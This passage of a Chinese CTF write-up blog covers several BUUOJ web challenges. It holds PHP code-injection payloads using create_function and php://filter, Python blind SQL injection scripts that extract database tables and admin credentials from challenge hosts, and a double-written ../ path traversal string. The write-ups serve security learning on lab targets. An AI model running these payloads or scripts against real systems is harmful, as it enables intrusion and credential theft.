<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">%64%65%62%75&#x3D;1&amp;file&#x3D;1</span><br><span class="line"></span><br><span class="line">url解码后：</span><br><span class="line">&#x2F;1nD3x.php?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到回显：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213180730536.png" alt></p>
<p>取反绕过+伪协议读源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">url解码结果：</span><br><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1flag.php);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>生成poc脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;</span><br><span class="line">$arr1 &#x3D; explode(&#39; &#39;, $a);</span><br><span class="line">echo &quot;&lt;br&gt;~(&quot;;</span><br><span class="line">foreach ($arr1 as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">	echo &quot;%&quot;.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;)&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>补充：因为<code>preg_match()</code>只能匹配字符串，数组可以绕过</p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://www.gem-love.com/websecurity/770.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/770.html</a></p>
<p><a href="https://imagin.vip/?p=166" target="_blank" rel="noopener">https://imagin.vip/?p=166</a></p>
</blockquote>
<h3 id="0x-04-网鼎杯2018-Unfinish"><a href="#0x-04-网鼎杯2018-Unfinish" class="headerlink" title="0x 04 [网鼎杯2018]Unfinish"></a>0x 04 [网鼎杯2018]Unfinish</h3><ul>
<li>考点</li>
</ul>
<p>SQL花式盲注、二次注入</p>
<ul>
<li>解题过程</li>
</ul>
<ol>
<li>题目存在注册界面，尝试进行二次注入</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line"># 对应后台语句为</span><br><span class="line">insert into users(email,username,password) values (&#39;aa&#39;,&#39;&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1&#39;,&#39;bb&#39;)</span><br></pre></td></tr></table></figure>

<p>存在延时，可以进行注入，编写exp如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;c509d4bd-4e45-48b5-a41f-63ea559f3fb6.node3.buuoj.cn&#x2F;register.php&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;username&quot;: payload,</span><br><span class="line">        &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;222@qq.com&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select * from flag limit 1 offset 0) from 1 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure>

<p>需要注意的是长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，最多每次比较10个字符长度，最后拼接成flag</p>
<blockquote>
<p>参考资料：</p>
<p><a href="https://glotozz.github.io/2019/11/20/buuctf-wp-8/" target="_blank" rel="noopener">https://glotozz.github.io/2019/11/20/buuctf-wp-8/</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p>
<p><a href="https://altman.vip/2018/08/22/WDB-2/#unfinished" target="_blank" rel="noopener">https://altman.vip/2018/08/22/WDB-2/#unfinished</a></p>
</blockquote>
<h3 id="0x-05-Black-Watch-入群题-Web"><a href="#0x-05-Black-Watch-入群题-Web" class="headerlink" title="0x 05 [Black Watch 入群题]Web"></a>0x 05 [Black Watch 入群题]Web</h3><ul>
<li><p>考点</p>
<p>SQL注入</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<p>查询处的接口存在SQL注入，脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># if correct , return empty, else return something</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;8fdba9ab-ef49-4d4f-8f91-230c12ae7173.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;&quot;</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># [+] --&gt;admin,contents&lt;--</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;contents&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,title,content,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;admin&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,username,password,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># 5c15f69a,06ccfb16</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># e6d20586,863efe1a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(url_tmp):</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    res &#x3D; requests.get(url_tmp, headers&#x3D;header)</span><br><span class="line">    if res.status_code !&#x3D; 200:</span><br><span class="line">        return req(url_tmp)</span><br><span class="line">    else:</span><br><span class="line">        r &#x3D; res.content.decode(&#39;utf8&#39;)</span><br><span class="line">        if &quot;title&quot; in r:</span><br><span class="line">            return 1</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">index &#x3D; 1</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    u_bound &#x3D; 255; l_bound &#x3D; 0</span><br><span class="line">    while u_bound &gt;&#x3D; l_bound:</span><br><span class="line">        m_bound &#x3D; (u_bound + l_bound) &#x2F;&#x2F; 2</span><br><span class="line">        payload_tmp &#x3D; payload.format(index, m_bound)</span><br><span class="line">        url_tmp &#x3D; url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        if req(url_tmp)!&#x3D;&#39;&#39;:</span><br><span class="line">            u_bound &#x3D; m_bound - 1</span><br><span class="line">            tmp &#x3D; m_bound</span><br><span class="line">        else:</span><br><span class="line">            l_bound &#x3D; m_bound + 1</span><br><span class="line">    result +&#x3D; chr(tmp)</span><br><span class="line">    index +&#x3D; 1</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>这里有个坑 ，第一个账号是无效的，第二个账号可以成功登入</p>
<blockquote>
<p>参考资料：</p>
<p><a href="http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/</a></p>
<p><a href="http://www.ch4ser.top/2019/04/22/SQL题型记录/" target="_blank" rel="noopener">http://www.ch4ser.top/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</a></p>
</blockquote>
<h3 id="0x-06-virink-2019-files-share"><a href="#0x-06-virink-2019-files-share" class="headerlink" title="0x 06 virink_2019_files_share"></a>0x 06 virink_2019_files_share</h3><ul>
<li><p>考点</p>
<p>OpenResty、LFR、Lua - Regex</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>打开页面是拼魔方游戏</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216000926709.png" alt></p>
<ol start="2">
<li>查看js代码无过，发包测试发现服务器是用OpenResty服务器（OpenResty是一个基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数的依赖项。）</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001215842.png" alt></p>
<ol start="3">
<li>在源代码处发现存在一个uploads文件夹，访问下</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001314589.png" alt></p>
<ol start="4">
<li>里面左边preview的格式是/preview?f= 尝试文件包含漏洞,由于是使用OpenResty，尝试包含nginx的配置文件，默认是<code>/etc/nginx/conf.d/default.conf</code>,发现<code>../</code>被过滤，尝试下双写可以绕过</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001437543.png" alt></p>
<ol start="5">
<li><p>首页注释代码提示Hint : flag in f1ag_Is_h3re </p>
<p>构造：<code>/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag</code></p>
<p>获得flag</p>
</li>
</ol>

  </div>
</article>

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-CISCN2019-华东南赛区-Double-Secret"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [CISCN2019 华东南赛区]Double Secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-网鼎杯-2018-Comment"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [网鼎杯 2018]Comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-BJDCTF2020-EzPHP"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [BJDCTF2020]EzPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-网鼎杯2018-Unfinish"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-Black-Watch-入群题-Web"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [Black Watch 入群题]Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-virink-2019-files-share"><span class="toc-number">6.</span> <span class="toc-text">0x 06 virink_2019_files_share</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&title=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&title=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&text=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（一）&body=Check out this article: http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 John Doe 
    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
    
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  
  <div class="footer-custom">
    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
     
      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
        <img class="img-response" src="/images/upyun.png" alt="cdn image">
      </a>
    
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">


<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>


<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

</body>
</html>
